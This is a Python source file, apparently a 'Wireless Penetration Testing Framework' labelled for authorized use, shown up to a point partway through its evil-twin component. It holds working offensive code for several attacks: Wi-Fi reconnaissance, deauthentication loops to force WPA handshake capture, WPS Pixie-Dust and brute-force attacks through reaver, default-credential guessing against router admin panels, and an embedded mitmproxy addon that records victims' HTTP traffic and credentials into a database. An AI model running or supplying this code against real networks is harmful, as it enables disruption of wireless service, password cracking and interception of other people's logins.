#!/usr/bin/env python3
# =============================================================================
#  W I R E S H A R K  P E N T E S T  F R A M E W O R K
#  WPF - Wireless Penetration Testing Framework
#  Author   : Huzefa Khalil Dayanji
#  Version  : 1.7.0 (Scapy Recon + Aircrack-ng Attack Suite + WPS/DoS Fix)
#  Platform : Linux / Kali (requires root)
#  Deps     : scapy, aircrack-ng, requests, flask, mitmproxy, hostapd, tabulate
#  Legal    : FOR AUTHORIZED PENETRATION TESTING ONLY
# =============================================================================

import os, sys, re, json, csv, time, socket, struct, threading, subprocess
import signal, argparse, sqlite3, datetime, ipaddress, hashlib, binascii, shutil
from collections import defaultdict
from pathlib import Path

# =============================================================================
#  R O O T   C H E C K
# =============================================================================
if os.geteuid() != 0:
    print("\033[91m\033[1m[✗]\033[0m This tool requires root privileges. Please run it as root.")
    print(f"\033[93m[!]\033[0m Example: \033[96msudo python3 {sys.argv[0]}\033[0m")
    sys.exit(1)

# Graceful import for optional heavy deps
try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth, RadioTap,
        sendp, sniff, conf as scapy_conf
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

try:
    import requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from flask import Flask, request as flask_req, render_template_string, redirect
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

try:
    from tabulate import tabulate
    TABULATE_OK = True
except ImportError:
    TABULATE_OK = False

# =============================================================================
#  C O L O R   P A L E T T E
# =============================================================================
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    ORANGE  = "\033[38;5;208m"
    PURPLE  = "\033[38;5;135m"
    BG_RED  = "\033[41m"
    TRUE_ORANGE = "\033[38;2;255;165;0m"


def banner():
    b = f"""
{C.CYAN}{C.BOLD}
 ██╗    ██╗██████╗ ███████╗
 ██║    ██║██╔══██╗██╔════╝
 ██║ █╗ ██║██████╔╝█████╗
 ██║███╗██║██╔═══╝ ██╔══╝
 ╚███╔███╔╝██║     ██║
  ╚══╝╚══╝ ╚═╝     ╚═╝
{C.PURPLE}  Wireless Pentest Framework v1.7.0
{C.DIM}  For Authorized Testing Only – Use Responsibly{C.RESET}
"""
    print(b)


def tag(color, label, msg):
    print(f"{color}{C.BOLD}[{label}]{C.RESET} {msg}")


def info(msg):    tag(C.CYAN,    "*", msg)
def success(msg): tag(C.GREEN,   "+", msg)
def warn(msg):    tag(C.YELLOW,  "!", msg)
def error(msg):   tag(C.RED,     "✗", msg)
def attack(msg):  tag(C.MAGENTA, "⚡", msg)
def section(msg): print(f"\n{C.BLUE}{C.BOLD}{'═'*70}\n  {msg}\n{'═'*70}{C.RESET}")


# =============================================================================
#  D E P E N D E N C Y   C H E C K E R   &   A U T O - I N S T A L L E R
# =============================================================================
REQUIRED_BINS = [
    "airodump-ng", "aireplay-ng", "aircrack-ng", "airmon-ng",
    "iw", "ip", "iwconfig",
    "hostapd", "dnsmasq",
    "reaver",
    "mitmdump",
    "tcpdump",
    "iptables",
    "sysctl",
    "hcxpcapngtool",
]

BIN_TO_PKG = {
    "airodump-ng":   "aircrack-ng",
    "aireplay-ng":   "aircrack-ng",
    "aircrack-ng":   "aircrack-ng",
    "airmon-ng":     "aircrack-ng",
    "iw":            "iw",
    "ip":            "iproute2",
    "iwconfig":      "wireless-tools",
    "hostapd":       "hostapd",
    "dnsmasq":       "dnsmasq",
    "reaver":        "reaver",
    "mitmdump":      None,
    "tcpdump":       "tcpdump",
    "iptables":      "iptables",
    "sysctl":        "procps",
    "hcxpcapngtool": "hcxtools",
}

PIP_BINS = {
    "mitmdump": "mitmproxy",
}


def _whereis_check(binary: str) -> bool:
    try:
        result = subprocess.run(
            ["whereis", binary],
            capture_output=True,
            text=True,
            timeout=5
        )
        parts = result.stdout.split(":")
        if len(parts) >= 2:
            paths_str = parts[1].strip()
            if paths_str:
                for p in paths_str.split():
                    if Path(p).exists():
                        return True
            return False
        return shutil.which(binary) is not None
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return shutil.which(binary) is not None


def check_and_install_dependencies():
    section("Dependency Check – Verifying Required Binaries")

    missing_apt_pkgs  = []
    missing_pip_pkgs  = []
    missing_bin_names = []

    for binary in REQUIRED_BINS:
        found  = _whereis_check(binary)
        status = f"{C.GREEN}✔ Found{C.RESET}" if found else f"{C.RED}✗ Missing{C.RESET}"
        print(f"  {C.CYAN}{binary:<20}{C.RESET}  {status}")

        if not found:
            missing_bin_names.append(binary)
            if binary in PIP_BINS:
                pkg = PIP_BINS[binary]
                if pkg not in missing_pip_pkgs:
                    missing_pip_pkgs.append(pkg)
            else:
                pkg = BIN_TO_PKG.get(binary, binary)
                if pkg and pkg not in missing_apt_pkgs:
                    missing_apt_pkgs.append(pkg)

    python_pkgs = {
        "scapy":    SCAPY_OK,
        "tabulate": TABULATE_OK,
        "requests": REQUESTS_OK,
        "flask":    FLASK_OK,
    }

    for pkg, ok in python_pkgs.items():
        status = f"{C.GREEN}✔ Found{C.RESET}" if ok else f"{C.RED}✗ Missing{C.RESET}"
        print(f"  {C.CYAN}{pkg:<20}{C.RESET}  {status}")
        if not ok and pkg not in missing_pip_pkgs:
            missing_pip_pkgs.append(pkg)

    if not missing_apt_pkgs and not missing_pip_pkgs:
        success("All dependencies are installed. Proceed further.")
        return

    print()
    warn(f"Missing binaries  : {C.RED}{', '.join(missing_bin_names)}{C.RESET}")
    if missing_apt_pkgs:
        warn(f"apt packages needed: {C.YELLOW}{' '.join(missing_apt_pkgs)}{C.RESET}")
    if missing_pip_pkgs:
        warn(f"pip packages needed: {C.YELLOW}{' '.join(missing_pip_pkgs)}{C.RESET}")

    print()
    choice = input(
        f"{C.CYAN}[?]{C.RESET} Do you want to Auto-install? {C.GREEN}[Y]{C.RESET}/{C.RED}n{C.RESET}: "
    ).strip().lower()

    if choice == "n":
        warn("Skipped dependency installation. Some features might not work.")
        warn("Manually install:")
        if missing_apt_pkgs:
            print(f"  {C.YELLOW}sudo apt install {' '.join(missing_apt_pkgs)} -y{C.RESET}")
        if missing_pip_pkgs:
            print(f"  {C.YELLOW}pip install {' '.join(missing_pip_pkgs)}{C.RESET}")
        return

    if missing_apt_pkgs:
        info("Running apt update...")
        subprocess.run(["apt", "update", "-y"], check=False)
        apt_cmd = ["apt", "install", "-y"] + missing_apt_pkgs
        info(f"Running: {C.YELLOW}{' '.join(apt_cmd)}{C.RESET}")
        result = subprocess.run(apt_cmd)
        if result.returncode == 0:
            success(f"apt packages installed: {' '.join(missing_apt_pkgs)}")
        else:
            error(f"apt install failed. Try manually: apt install {' '.join(missing_apt_pkgs)} -y")

    if missing_pip_pkgs:
        pip_cmd = [sys.executable, "-m", "pip", "install"] + missing_pip_pkgs
        info(f"Running: {C.YELLOW}{' '.join(pip_cmd)}{C.RESET}")
        result = subprocess.run(pip_cmd)
        if result.returncode == 0:
            success(f"pip packages installed: {' '.join(missing_pip_pkgs)}")
            warn("Re-run the script so new imports load correctly.")
            sys.exit(0)
        else:
            error(f"pip install failed. Try manually: pip install {' '.join(missing_pip_pkgs)}")

    success("Dependency installation complete!")


def check_deps():
    if not SCAPY_OK:
        error("Scapy missing. Install: pip install scapy"); sys.exit(1)
    if not TABULATE_OK:
        error("Tabulate missing. Install: pip install tabulate"); sys.exit(1)
    missing = [d for d in ["airodump-ng", "aireplay-ng", "aircrack-ng", "iw", "ip"]
               if shutil.which(d) is None]
    if missing:
        error(f"Missing system deps: {', '.join(missing)}")
        error("Install: apt install aircrack-ng iw iproute2")
        sys.exit(1)


# =============================================================================
#  D A T A B A S E   ( SQLite )
# =============================================================================
DB_PATH = Path("wpf_results.db")


def db_init():
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.executescript("""
    CREATE TABLE IF NOT EXISTS access_points (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        bssid        TEXT UNIQUE,
        essid        TEXT,
        channel      INTEGER,
        band         TEXT,
        rssi         INTEGER,
        encryption   TEXT,
        wps          INTEGER DEFAULT 0,
        wps_locked   INTEGER DEFAULT 0,
        hidden       INTEGER DEFAULT 0,
        manufacturer TEXT,
        first_seen   TEXT,
        last_seen    TEXT
    );
    CREATE TABLE IF NOT EXISTS clients (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        mac          TEXT,
        ap_bssid     TEXT,
        rssi         INTEGER,
        manufacturer TEXT,
        first_seen   TEXT
    );
    CREATE TABLE IF NOT EXISTS handshakes (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        bssid       TEXT,
        essid       TEXT,
        capfile     TEXT,
        pmkid       TEXT,
        cracked     INTEGER DEFAULT 0,
        password    TEXT,
        captured_at TEXT
    );
    CREATE TABLE IF NOT EXISTS credentials (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        ssid     TEXT,
        username TEXT,
        password TEXT,
        source   TEXT,
        ts       TEXT
    );
    CREATE TABLE IF NOT EXISTS http_traffic (
        id        INTEGER PRIMARY KEY AUTOINCREMENT,
        client_ip TEXT,
        method    TEXT,
        url       TEXT,
        host      TEXT,
        post_body TEXT,
        ts        TEXT
    );
    """)
    con.commit()
    con.close()


def db_upsert_ap(ap: dict):
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    now = datetime.datetime.now().isoformat()
    cur.execute("""
        INSERT INTO access_points
            (bssid,essid,channel,band,rssi,encryption,wps,hidden,manufacturer,first_seen,last_seen)
        VALUES (?,?,?,?,?,?,?,?,?,?,?)
        ON CONFLICT(bssid) DO UPDATE SET
            essid=excluded.essid, rssi=excluded.rssi,
            encryption=excluded.encryption, wps=excluded.wps,
            last_seen=excluded.last_seen
    """, (ap.get("bssid"), ap.get("essid", "<hidden>"), ap.get("channel", 0),
          ap.get("band", "2.4GHz"), ap.get("rssi", -100), ap.get("encryption", "UNKNOWN"),
          ap.get("wps", 0), ap.get("hidden", 0), ap.get("manufacturer", "Unknown"), now, now))
    con.commit()
    con.close()


def db_insert_handshake(bssid, essid, capfile, pmkid=None):
    con = sqlite3.connect(DB_PATH)
    now = datetime.datetime.now().isoformat()
    con.execute(
        "INSERT INTO handshakes(bssid,essid,capfile,pmkid,captured_at) VALUES(?,?,?,?,?)",
        (bssid, essid, capfile, pmkid, now))
    con.commit()
    con.close()


def db_insert_cred(ssid, username, password, source):
    con = sqlite3.connect(DB_PATH)
    now = datetime.datetime.now().isoformat()
    con.execute(
        "INSERT INTO credentials(ssid,username,password,source,ts) VALUES(?,?,?,?,?)",
        (ssid, username, password, source, now))
    con.commit()
    con.close()


# =============================================================================
#  O U I   L O O K U P
# =============================================================================
_OUI_CACHE: dict = {}


def _load_local_oui():
    paths = [
        "/usr/share/nmap/nmap-mac-prefixes",
        "/usr/share/arp-scan/ieee-oui.txt",
        "/usr/share/wireshark/manuf",
    ]
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p) as f:
                    for line in f:
                        parts = line.strip().split(None, 1)
                        if len(parts) == 2:
                            _OUI_CACHE[parts[0].upper().replace(":", "").replace("-", "")] = parts[1]
            except Exception:
                pass
            if _OUI_CACHE:
                return True
    return False


_load_local_oui()


def oui_lookup(mac: str) -> str:
    prefix = mac.upper().replace(":", "").replace("-", "")[:6]
    return _OUI_CACHE.get(prefix, "Unknown")


# =============================================================================
#  I N T E R F A C E   M A N A G E M E N T
# =============================================================================
class InterfaceManager:
    @staticmethod
    def list_all() -> list:
        try:
            out = subprocess.check_output(["iw", "dev"], text=True)
            return re.findall(r"Interface (\S+)", out)
        except Exception:
            return []

    @staticmethod
    def supports_monitor(iface: str) -> bool:
        try:
            phy      = subprocess.check_output(["iw", "dev", iface, "info"], text=True)
            m        = re.search(r"wiphy (\d+)", phy)
            phy_name = f"phy{m.group(1)}" if m else "phy0"
            out      = subprocess.check_output(["iw", "phy", phy_name, "info"], text=True)
            return "monitor" in out
        except Exception:
            return False

    @staticmethod
    def detect_monitor_capable() -> list:
        section("Interface Detection - Monitor Mode Capable")
        found  = []
        ifaces = InterfaceManager.list_all()
        for iface in ifaces:
            cap    = InterfaceManager.supports_monitor(iface)
            status = (f"{C.GREEN}✔ Monitor Capable{C.RESET}" if cap
                      else f"{C.RED}✗ Managed Only{C.RESET}")
            print(f"  {C.CYAN}{iface:<15}{C.RESET} {status}")
            if cap:
                found.append(iface)
        if not found:
            error("No monitor-capable interfaces found. Plug in a compatible adapter.")
        return found

    @staticmethod
    def set_monitor(iface: str) -> bool:
        info(f"Setting {C.YELLOW}{iface}{C.RESET} → Monitor Mode")
        subprocess.run(["ip", "link", "set", iface, "down"],           capture_output=True)
        subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"],             capture_output=True)
        time.sleep(0.5)
        out = subprocess.run(["iw", "dev", iface, "info"],
                             capture_output=True, text=True).stdout
        if "type monitor" in out:
            success(f"{iface} is now in {C.GREEN}Monitor Mode{C.RESET}")
            return True
        subprocess.run(["airmon-ng", "start", iface], capture_output=True)
        return True

    @staticmethod
    def set_managed(iface: str):
        info(f"Restoring {C.YELLOW}{iface}{C.RESET} → Managed Mode")
        subprocess.run(["ip", "link", "set", iface, "down"],           capture_output=True)
        subprocess.run(["iw", "dev", iface, "set", "type", "managed"], capture_output=True)
        subprocess.run(["ip", "link", "set", iface, "up"],             capture_output=True)
        subprocess.run(["service", "NetworkManager", "start"],          capture_output=True)
        success(f"{iface} restored to Managed Mode")

    @staticmethod
    def set_channel(iface: str, ch: int):
        subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True)


# =============================================================================
#  P H A S E  1  –  R E C O N N A I S S A N C E  ( S C A P Y )
# =============================================================================
class Recon:
    def __init__(self, iface: str, timeout: int = 30):
        self.iface            = iface
        self.timeout          = timeout
        self.aps              = {}
        self.clients          = defaultdict(set)
        self._lock            = threading.Lock()
        self._running         = False
        self.target_bssid     = None
        self.seen_bssid_print = set()

    def _channel_to_band(self, ch: int) -> str:
        if ch <= 14:  return "2.4GHz"
        if ch <= 177: return "5GHz"
        return "6GHz"

    def _get_encryption(self, pkt) -> str:
        enc = []
        has_rsn  = False
        wpa1     = False
        rsn_data = b""

        # Walk all Information Elements first
        elt = pkt[Dot11Elt] if pkt.haslayer(Dot11Elt) else None
        while elt:
            if elt.ID == 48:  # RSN IE → WPA2/WPA3
                has_rsn  = True
                rsn_data = bytes(elt.info) if elt.info else b""
            elif (elt.ID == 221 and elt.info and len(elt.info) >= 4
                and elt.info[:4] == b"\x00P\xf2\x01"):  # WPA1 vendor IE
                wpa1 = True
            try:
                elt = elt.payload[Dot11Elt]
            except Exception:
                break

        if has_rsn:
            # Try to parse AKM suites for WPA3-SAE / OWE
            if len(rsn_data) >= 8:
                try:
                    # RSN layout: version(2) + group_cipher(4) + pairwise_count(2)
                    #             + pairwise_list(4*n) + akm_count(2) + akm_list(4*n)
                    pairwise_count = struct.unpack("<H", rsn_data[2:4])[0]
                    akm_offset     = 4 + (pairwise_count * 4)  # skip pairwise list
                    if akm_offset + 2 <= len(rsn_data):
                        akm_count = struct.unpack("<H", rsn_data[akm_offset:akm_offset + 2])[0]
                        akm_offset += 2
                        for _ in range(akm_count):
                            if akm_offset + 4 > len(rsn_data):
                                break
                            suite = rsn_data[akm_offset:akm_offset + 4]
                            if suite[3] == 8:   enc.append("WPA3-SAE")
                            elif suite[3] == 18: enc.append("OWE")
                            akm_offset += 4
                except Exception:
                    pass
            if not enc:
                enc.append("WPA2")
            if wpa1:
                enc.append("+WPA")

        elif wpa1:
            enc.append("WPA")

        else:
            # No RSN IE and no WPA1 IE — fall back to privacy bit
            try:
                if pkt.haslayer(Dot11Beacon):
                    cap = int(pkt[Dot11Beacon].cap)
                elif pkt.haslayer(Dot11ProbeResp):
                    cap = int(pkt[Dot11ProbeResp].cap)
                else:
                    cap = 0
            except Exception:
                cap = 0

            if cap & 0x10:
                enc.append("WEP")
            else:
                enc.append("OPEN")

        return "/".join(enc) if enc else "OPEN"
    
    def _is_wps_enabled(self, pkt) -> bool:
        elt = pkt[Dot11Elt] if pkt.haslayer(Dot11Elt) else None
        while elt:
            if elt.ID == 221 and elt.info and len(elt.info) >= 4:
                if elt.info[:4] == b"\x00P\xf2\x04":
                    return True
            try:
                elt = elt.payload[Dot11Elt]
                # if elt.payload[Dot11Elt]:
                #     print("Found Dot11Elt in the elt.payload list")
                # else:
                #     print("[!] Couldn't found elt.payload[Dot11Elt] in the elt.payload.")
            except Exception:
                break
        return False

    def _pkt_handler(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                bssid = pkt[Dot11].addr3
                if not bssid or bssid == "ff:ff:ff:ff:ff:ff":
                    return
                bssid = bssid.lower()
                if self.target_bssid and bssid != self.target_bssid:
                    return

                ssid_elt = pkt[Dot11Elt]
                essid    = ""
                while ssid_elt:
                    if ssid_elt.ID == 0:
                        try:    essid = ssid_elt.info.decode("utf-8", "ignore")
                        except: essid = ""
                        break
                    try:    ssid_elt = ssid_elt.payload[Dot11Elt]
                    except: break

                hidden = 1 if (not essid or essid == "\x00") else 0
                rssi   = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) else -100
                ch     = 0
                elt    = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 3 and elt.info:
                        ch = elt.info[0]
                        break
                    try:    elt = elt.payload[Dot11Elt]
                    except: break

                enc  = self._get_encryption(pkt)
                wps  = self._is_wps_enabled(pkt)
                mfr  = oui_lookup(bssid)
                band = self._channel_to_band(ch)

                with self._lock:
                    if bssid not in self.aps:
                        ap = dict(bssid=bssid, essid=essid, channel=int(ch),
                                  band=band, rssi=int(rssi), encryption=enc,
                                  wps=int(wps), hidden=hidden, manufacturer=mfr)
                        self.aps[bssid] = ap
                        db_upsert_ap(ap)

                        if bssid not in self.seen_bssid_print:
                            self.seen_bssid_print.add(bssid)
                            enc_color = (C.RED if "WEP" in enc or enc == "OPEN"
                                         else (C.GREEN if "WPA3" in enc else C.YELLOW))
                            wps_tag   = f"{C.RED}[WPS]{C.RESET}"        if wps    else ""
                            hid_tag   = f"{C.MAGENTA}[HIDDEN]{C.RESET}" if hidden else ""
                            ssid_disp = essid if essid else f"{C.DIM}<hidden>{C.RESET}"
                            print(f"  {C.CYAN}{bssid}{C.RESET}  "
                                  f"{C.WHITE}{ssid_disp:<24}{C.RESET} "
                                  f"CH:{C.YELLOW}{ch:>2}{C.RESET}  "
                                  f"{enc_color}{enc:<10}{C.RESET}  "
                                  f"RSSI:{C.BLUE}{rssi:>4}{C.RESET}  "
                                  f"{wps_tag}{hid_tag}")
                    else:
                        self.aps[bssid]["rssi"] = int(rssi)
                        if self.aps[bssid]["hidden"] and essid:
                            self.aps[bssid]["essid"]  = essid
                            self.aps[bssid]["hidden"] = 0

            elif pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
                fc = pkt[Dot11].FCfield
                ds = (fc & 0x3)
                if ds == 1:
                    client   = pkt[Dot11].addr2
                    ap_bssid = pkt[Dot11].addr1
                elif ds == 2:
                    client   = pkt[Dot11].addr1
                    ap_bssid = pkt[Dot11].addr2
                else:
                    return

                if client and ap_bssid:
                    client   = client.lower()
                    ap_bssid = ap_bssid.lower()

                    # Skip broadcast and multicast MACs
                    # Broadcast: ff:ff:ff:ff:ff:ff
                    # Multicast: first octet has LSB set (e.g. 01:xx, 03:xx, 33:33:xx)
                    first_octet = int(client.split(":")[0], 16)
                    if first_octet & 0x01:
                        return

                    if self.target_bssid and ap_bssid != self.target_bssid:
                        return
                    with self._lock:
                        self.clients[ap_bssid].add(client)
        except Exception:
            pass

    def _channel_hop(self):
        channels_24 = list(range(1, 14))
        channels_5  = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112,
                        116, 132, 136, 140, 149, 153, 157, 161, 165]
        while self._running:
            for ch in (channels_24 + channels_5):
                if not self._running:
                    break
                InterfaceManager.set_channel(self.iface, ch)
                time.sleep(0.15)

    def run(self, target_bssid=None, channel=None):
        self.target_bssid = target_bssid.lower() if target_bssid else None

        if self.target_bssid and channel:
            section(f"Phase 1b – Targeted Client Discovery ({self.target_bssid} on CH {channel})")
            InterfaceManager.set_channel(self.iface, int(channel))
        else:
            section("Phase 1 – Reconnaissance & Discovery (Scapy)")
            self._running = True
            threading.Thread(target=self._channel_hop, daemon=True).start()

        info(f"Sniffing packets for {self.timeout}s via Scapy. Please wait...\n")
        try:
            sniff(iface=self.iface, prn=self._pkt_handler,
                  timeout=self.timeout, store=False)
        except KeyboardInterrupt:
            print()
            warn("Scan interrupted early by user.")

        self._running = False
        time.sleep(0.5)
        self.display_tabular(self.aps, self.clients)
        return self.aps, self.clients

    def display_tabular(self, aps, clients):
        print()
        ap_table = []
        for bssid, ap in aps.items():
            ssid_disp = ap["essid"] if ap["essid"] else f"{C.DIM}<hidden>{C.RESET}"
            enc_color = (f"{C.RED}{ap['encryption']}{C.RESET}"
                         if "WEP" in ap["encryption"] or ap["encryption"] == "OPEN"
                         else f"{C.GREEN}{ap['encryption']}{C.RESET}")
            wps_ind = f"{C.GREEN}Yes{C.RESET}" if ap.get("wps") else "No"
            ap_table.append([
                f"{C.CYAN}{bssid}{C.RESET}",
                ssid_disp,
                f"{C.YELLOW}{ap['channel']}{C.RESET}",
                enc_color,
                wps_ind,
                f"{C.BLUE}{ap['rssi']}{C.RESET}",
                f"{C.ORANGE}{ap['manufacturer'][:20]}{C.RESET}",
            ])

        print(tabulate(ap_table,
                       headers=["BSSID", "ESSID", "CH", "ENCRYPTION", "WPS", "RSSI", "MANUFACTURER"],
                       tablefmt="fancy_grid"))

        client_table = []
        for bssid, macs in clients.items():
            for mac in macs:
                client_table.append([
                    f"{C.CYAN}{mac}{C.RESET}",
                    f"{C.YELLOW}{bssid}{C.RESET}",
                    f"{C.ORANGE}{oui_lookup(mac)[:20]}{C.RESET}",
                ])

        print(f"\n{C.BOLD}Connected Clients:{C.RESET}")
        if client_table:
            print(tabulate(client_table,
                           headers=["CLIENT MAC", "ASSOCIATED AP (BSSID)", "MANUFACTURER"],
                           tablefmt="fancy_grid"))
        else:
            print(f"  {C.DIM}No associated clients discovered.{C.RESET}\n")


# =============================================================================
#  P H A S E  2  –  V U L N E R A B I L I T Y   A S S E S S M E N T
# =============================================================================
class VulnAssessment:
    DEFAULT_CREDS = [
        ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
        ("admin", ""),      ("root", "root"),       ("admin", "admin123"),
        ("user", "user"),   ("admin", "12345678"),
    ]

    def check_wpa3_downgrade(self, ap: dict) -> bool:
        enc = ap.get("encryption", "")
        if "WPA3" in enc and ("WPA2" in enc or "WPA" in enc):
            warn(f"{ap['bssid']} – {C.RED}WPA3 Transition Mode (Downgrade Risk){C.RESET}")
            return True
        return False

    def check_wep_networks(self, aps: dict) -> list:
        wep = [a for a in aps.values() if "WEP" in a.get("encryption", "")]
        for ap in wep:
            error(f"WEP network: {ap['bssid']} ({ap.get('essid', '')}) "
                  f"– {C.BG_RED}CRITICALLY INSECURE{C.RESET}")
        return wep

    def check_open_networks(self, aps: dict) -> list:
        opens = [a for a in aps.values() if "OPEN" in a.get("encryption", "")]
        for ap in opens:
            warn(f"Open network: {ap['bssid']} ({ap.get('essid', '')})")
        return opens

    def default_cred_check(self, ip: str, ssid: str = "") -> list:
        found = []
        for port in [80, 8080, 443, 8443]:
            for user, pw in self.DEFAULT_CREDS:
                try:
                    proto = "https" if port in [443, 8443] else "http"
                    r = requests.get(f"{proto}://{ip}:{port}/",
                                     auth=(user, pw), timeout=2, verify=False)
                    if r.status_code == 200:
                        success(f"Default creds on {ip}:{port} – {C.GREEN}{user}:{pw}{C.RESET}")
                        db_insert_cred(ssid, user, pw, f"default_cred:{ip}:{port}")
                        found.append((user, pw, port))
                except Exception:
                    pass
        if not found:
            info(f"No default creds matched on {ip}")
        return found

    def run_all(self, aps: dict):
        section("Phase 2 – Vulnerability Assessment")
        if not aps:
            warn("No APs to assess. Run Recon first.")
            return
        self.check_wep_networks(aps)
        self.check_open_networks(aps)
        for ap in aps.values():
            self.check_wpa3_downgrade(ap)


# =============================================================================
#  P H A S E  3  –  H A N D S H A K E   C A P T U R E  ( a i r c r a c k - n g )
# =============================================================================
class HandshakeCapture:
    def __init__(self, iface: str, bssid: str, essid: str, channel: int,
                 client_mac: str = None, timeout: int = 45):
        self.iface   = iface
        self.bssid   = bssid.lower()
        self.essid   = essid
        self.channel = channel
        self.client  = client_mac
        self.timeout = timeout
        self.prefix  = f"/tmp/wpf_hs_{self.bssid.replace(':', '')}"
        self.capfile = f"captures/{self.essid.replace('/', '_')}_{self.bssid.replace(':', '')}.cap"

    def _clean_tmp(self):
        for f in Path("/tmp").glob(f"wpf_hs_{self.bssid.replace(':', '')}*"):
            try:    f.unlink()
            except: pass

    def _deauth(self):
        cmd = ["aireplay-ng", "-0", "5", "-a", self.bssid]
        if self.client:
            cmd.extend(["-c", self.client])
        cmd.append(self.iface)
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        attack(f"Sent 5 deauth frames to {self.client or 'broadcast'}")

    def run(self) -> tuple:
        self._clean_tmp()
        Path("captures").mkdir(exist_ok=True)
        attack(f"Handshake capture: {self.essid} ({self.bssid}) on CH {self.channel}")
        InterfaceManager.set_channel(self.iface, self.channel)

        dump_cmd = ["airodump-ng", "-c", str(self.channel), "--bssid", self.bssid,
                    "-w", self.prefix, "--output-format", "pcap", self.iface]
        proc = subprocess.Popen(dump_cmd,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        def deauth_loop():
            for _ in range(self.timeout // 10):
                time.sleep(5)
                if proc.poll() is not None:
                    break
                self._deauth()

        threading.Thread(target=deauth_loop, daemon=True).start()

        info(f"Capturing packets for {self.timeout} seconds...")
        try:    time.sleep(self.timeout)
        except KeyboardInterrupt:
            warn("Interrupted by user. Checking for handshakes...")

        proc.terminate()
        proc.wait(timeout=2)

        cap_out = f"{self.prefix}-01.cap"
        valid   = False
        if os.path.exists(cap_out):
            check = subprocess.run(["aircrack-ng", cap_out],
                                   capture_output=True, text=True)
            if ("1 handshake" in check.stdout
                    or "handshake" in check.stdout.lower()
                    or "WPA (" in check.stdout):
                valid = True

            shutil.move(cap_out, self.capfile)
            if valid:
                success(f"Handshake captured → {C.GREEN}{self.capfile}{C.RESET}")
            else:
                warn(f"Capture saved to {C.YELLOW}{self.capfile}{C.RESET} "
                     f"but aircrack-ng couldn't verify a full handshake.")

            db_insert_handshake(self.bssid, self.essid, self.capfile)
            self._clean_tmp()
            return self.capfile, ""
        else:
            error("Capture file not generated.")
            self._clean_tmp()
            return "", ""


# =============================================================================
#  P H A S E  3b  –  W P S   A T T A C K
# =============================================================================
class WPSAttack:
    def __init__(self, iface: str, bssid: str, channel: int, essid: str = ""):
        self.iface   = iface
        self.bssid   = bssid
        self.channel = channel
        self.essid   = essid

    def pixie_dust(self):
        attack(f"WPS Pixie-Dust on {self.bssid} ({self.essid}) CH {self.channel}")
        cmd = ["reaver", "-i", self.iface, "-b", self.bssid,
               "-K", "1", "-v", "-N", "-c", str(self.channel)]
        info(f"Running: {' '.join(cmd)}")
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                line = line.rstrip()
                if "WPS pin" in line or "PIN" in line.upper():
                    success(line)
                elif "failed" in line.lower() or "error" in line.lower():
                    error(line)
                else:
                    print(f"  {C.DIM}{line}{C.RESET}")
        except FileNotFoundError:
            error("reaver not found – install: apt install reaver")

    def brute_force(self):
        attack(f"WPS brute-force on {self.bssid} ({self.essid}) CH {self.channel}")
        cmd = ["reaver", "-i", self.iface, "-b", self.bssid,
               "-v", "-N", "-c", str(self.channel)]
        info(f"Running: {' '.join(cmd)}")
        try:
            subprocess.run(cmd)
        except FileNotFoundError:
            error("reaver not found – install: apt install reaver")


# =============================================================================
#  P H A S E  3c  –  E V I L   T W I N
# =============================================================================
class EvilTwin:
    HOSTAPD_CONF = "/tmp/wpf_hostapd.conf"
    DNSMASQ_CONF = "/tmp/wpf_dnsmasq.conf"
    MITM_SCRIPT  = "/tmp/wpf_mitm_addon.py"
    GW_IP        = "10.0.0.1"
    DHCP_START   = "10.0.0.2"
    DHCP_END     = "10.0.0.254"
    FLASK_PORT   = 5000
    MITM_PORT    = 8080

    MITM_ADDON_CODE = r'''
import mitmproxy.http
from mitmproxy import ctx
import datetime, json, sqlite3, os

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "wpf_results.db")

CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def _log(label, msg, color=CYAN):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"\n{color}{BOLD}[{label} {ts}]{RESET} {msg}", flush=True)

def _db(client_ip, method, url, host, post_body=""):
    try:
        con = sqlite3.connect(DB_PATH)
        now = datetime.datetime.now().isoformat()
        con.execute(
            "INSERT INTO http_traffic(client_ip,method,url,host,post_body,ts) VALUES(?,?,?,?,?,?)",
            (client_ip, method, url, host, post_body, now))
        con.commit(); con.close()
    except Exception:
        pass

def _db_cred(host, username, password, source):
    try:
        con = sqlite3.connect(DB_PATH)
        now = datetime.datetime.now().isoformat()
        con.execute(
            "INSERT INTO credentials(ssid,username,password,source,ts) VALUES(?,?,?,?,?)",
